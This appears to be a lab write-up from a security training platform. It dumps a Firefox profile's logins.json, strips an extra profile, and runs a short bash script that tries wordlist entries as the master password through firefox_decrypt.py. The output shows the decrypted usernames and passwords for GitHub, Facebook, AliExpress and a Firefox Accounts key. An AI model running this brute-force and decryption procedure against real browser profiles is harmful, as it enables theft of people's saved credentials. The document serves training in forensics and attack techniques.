# Firefox login

```
student@attackdefense:~$ cat .mozilla/firefox/zevp8nk2.default/logins.json | python -m json.tool
{
    "disabledHosts": [],
    "logins": [
        {
            "encType": 1,
            "encryptedPassword": "MIHbBBD4AAAAAAAAAAAAAAAAAAABMBQGCCqGSIb3DQMHBAhfvOetba7MWgSBsJfJlDfV4y3a8ldIunRL4MNmOGO6lUuzGlCNrM4Ybu7sPLar5gaWalq6AbbqXAs3JDaKo1iKKt6HagnJocyBJ+4BWpaXOSJX+hU86HYLXehKwcF1CrWQePIjdI63qY6zBGtrD4Pq1wSuH5zlTuKnHR1bVPRAtD2aVVT2aTaz2m0eiTuMr0yX7ZPcbKcK0zrlgFqC0g5OGovSvCAy2sMCPb2v6JAAmxDtt6971g/bzuBh",
            "encryptedUsername": "MFIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECHd6xEIDvTqMBCjzRw2euvxrdhypiEyuTo57CJTTMWl5FqK/h3aa+hRQd9XovS6A+uvb",
            "formSubmitURL": null,
            "guid": "{eedbf6dd-588b-46c5-b122-1999171667f6}",
            "hostname": "chrome://FirefoxAccounts",
            "httpRealm": "Firefox Accounts credentials",
            "id": 1,
            "passwordField": "",
            "timeCreated": 1539732575514,
            "timeLastUsed": 1539732575514,
            "timePasswordChanged": 1539732624376,
            "timesUsed": 1,
            "usernameField": ""
        },
        {
            "encType": 1,
            "encryptedPassword": "MEoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNjWX+pCLwJLBCARyQRvxyi6B5W7lebeGihKCtAeyBrTfml7VgI0iLEuOA==",
            "encryptedUsername": "MEoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECAzLGzgFuXpGBCAOwTxCQ6WCE0FosAyfbeTTlrvlQL2CgE/OSh/N0w+pyQ==",
            "formSubmitURL": "https://github.com",
            "guid": "{ccd2077a-2f06-406a-bf42-d8848243c86f}",
            "hostname": "https://github.com",
            "httpRealm": null,
            "id": 2,
            "passwordField": "password",
            "timeCreated": 1539733882060,
            "timeLastUsed": 1539733882060,
            "timePasswordChanged": 1539820282060,
            "timesUsed": 1,
            "usernameField": "login"
        },
        {
            "encType": 1,
            "encryptedPassword": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECC/m4+VZFgheBBjf+yYGYIV4NRY10kg6mdu1BydZx55GQ7Y=",
            "encryptedUsername": "MEoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECAOI+7Q1boh6BCCSq07wCfCKyyNnlGJJkL1TaXLwxfHI+poXJSjkMiuvvw==",
            "formSubmitURL": "https://www.facebook.com",
            "guid": "{dbf17b0b-cb6e-43bf-83f7-042b23484581}",
            "hostname": "https://www.facebook.com",
            "httpRealm": null,
            "id": 3,
            "passwordField": "pass",
            "timeCreated": 1539733955384,
            "timeLastUsed": 1539733955384,
            "timePasswordChanged": 1539733955384,
            "timesUsed": 1,
            "usernameField": "email"
        },
        {
            "encType": 1,
            "encryptedPassword": "MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECImw8Km0GSeTBBD7TLXRgYZmyaqxl7sSPxWt",
            "encryptedUsername": "MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIBTJSVn65xZBAgEPe0Xx07MEg==",
            "formSubmitURL": "https://login.aliexpress.com",
            "guid": "{e50968d5-c5e0-4f11-a63e-deffbcff0087}",
            "hostname": "https://login.aliexpress.com",
            "httpRealm": null,
            "id": 4,
            "passwordField": "_fmj.ex._0.p",
            "timeCreated": 1539734481542,
            "timeLastUsed": 1539734481542,
            "timePasswordChanged": 1539734481542,
            "timesUsed": 1,
            "usernameField": "_fmj.ex._0.l"
        }
    ],
    "nextId": 5,
    "version": 2
}
```

Convert to date
```
student@attackdefense:~$ date -d @1539733955
Tue Oct 16 23:52:35 UTC 2018
```

## What is the master password used in Firefox?

Current profile
```
student@attackdefense:~$ cat .mozilla/firefox/profiles.ini
[General]
StartWithLastProfile=1

[Profile0]
Name=default
IsRelative=1
Path=zevp8nk2.default
Default=1

[Profile1]
Name=default2
IsRelative=1
Path=aeestn32
Default=0
```

Remove dummy entry
```
student@attackdefense:~$ cat .mozilla/firefox/profiles.ini
[General]
StartWithLastProfile=1

[Profile0]
Name=default
IsRelative=1
Path=zevp8nk2.default
Default=1
```

Create brute force script
```
student@attackdefense:~/tools/firefox_decrypt$ cat brute.sh
#!/bin/bash

input=$1

while IFS= read -r var
do
echo "Trying: $var"
echo "$var" | python firefox_decrypt.py
done < "$input"
```

Run
```
Trying: marina
2021-05-02 11:06:37,696 - ERROR - Master password is not correct
Trying: diablo
2021-05-02 11:06:38,071 - ERROR - Master password is not correct
Trying: bulldog
2021-05-02 11:06:38,371 - ERROR - Master password is not correct
Trying: qwer1234

Website:   chrome://FirefoxAccounts
Username: 'b5257831dd2a487a9a6844a56bfa8fda'
Password: '{"version":1,"accountData":{"kA":"7f487f8400098d657c159b2d81bdb32aecba1c65044d64087958602aab2c9794","kB":"4b9e00ebeba6332e0093a14c48175abba65f4ca30d5ac301b35f71d998a4bb87"}}'

Website:   https://github.com
Username: 'strange_people86@kmail.xyz'
Password: 'password@github@strange99'

Website:   https://www.facebook.com
Username: 'strange_people86@kmail.xyz'
Password: 'test@password@1234#'

Website:   https://login.aliexpress.com
Username: 'HopheT'
Password: 'Password123321'
```
